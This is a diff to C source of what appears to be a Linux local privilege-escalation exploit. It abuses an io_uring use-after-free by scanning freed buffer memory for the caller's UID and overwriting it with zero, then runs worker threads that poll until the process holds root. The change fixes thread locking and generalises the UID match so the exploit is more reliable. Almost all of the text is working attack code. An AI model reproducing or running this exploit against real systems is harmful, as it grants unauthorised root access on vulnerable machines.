@@ -49,14 +49,21 @@ void *setcap_worker(void *param) {
     if (syscall(SYS_capset, &cap_header, (void *)cap_data)) errExit("capset() failed");
 
     while (1) {
-        if ((getuid() == 0 || geteuid() == 0) && !state.exist_root) {
-            pthread_mutex_lock(&lock);
-            {
-                state.exist_root = true;
-            }
+        pthread_mutex_lock(&lock);
+        // 既に権限昇格したスレッドがある場合は終了
+        if (state.exist_root) {
+            pthread_mutex_unlock(&lock);
+            return NULL;
+        }
+
+        // UIDが書き変わっているか確認
+        if ((getuid() == 0 || geteuid() == 0)) {
+            state.exist_root = true;
+            // ロックを解除して，ループを抜ける
             pthread_mutex_unlock(&lock);
             break;
-        } 
+        }
+        pthread_mutex_unlock(&lock);
         usleep(1000);
     }
     printf("Now, I am root!\n");
@@ -115,20 +122,15 @@ int main() {
     // Use-After-Free
     printf("check\n");
     uid_t user_id = getuid();
-    // for (int i = 0; i < 0x1000 / sizeof(uint64_t); i++) {
-    //     uint64_t value = *((uint64_t *)pbuf_map + i);
-    //     if (value) printf("pbuf_map[%03d]: 0x%016lx\n", i, value);
-    // }
     for (int i = 0; i < 0x1000 / sizeof(uint16_t); i++) {
         uint16_t *value = (uint16_t *)pbuf_map + i;
-        if (*value == 0x3e8) {
+        if (*value == user_id) {
             printf("found!\n");
             *value = 0x00;
             // break;
         }
     }
 
-    // wait(0);
     sleep(900);
 
     io_uring_queue_exit(&ring);
